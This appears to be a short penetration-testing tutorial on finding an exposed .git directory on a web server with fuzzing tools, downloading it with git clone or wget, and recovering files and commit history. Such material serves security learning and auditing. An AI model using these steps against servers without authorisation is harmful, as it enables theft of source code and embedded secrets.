To find the exposed directory, we could use `enumeration` by manually searching for .git directory or by using fuzzing tools like gobuster, feroxbuster; Using DotGit extension is another way of finding this exposed directory.

To clone a directory we could use:

```bash
git clone http://<ipaddress>/.git
```

Sometimes this command doesn't work so we could use:

```bash
wget --mirror -I .git http://<ipaddress>/.git
```

Now we navigate to the directory, and we can use some commands to check if we can restore some files or see previous commits.

To check the git status we will use the command:

```bash
git status
```

To recover files we can use one of the two commands below:

```bash
git checkout --
or 
git restore .
```

we could also check the logs using this command, which shows a list of all the commits made to a repository:

```bash
git log
```

Now we can use this command to check an individual commit:

```bash
git show "commit-id" # we can find this id from git log command
```
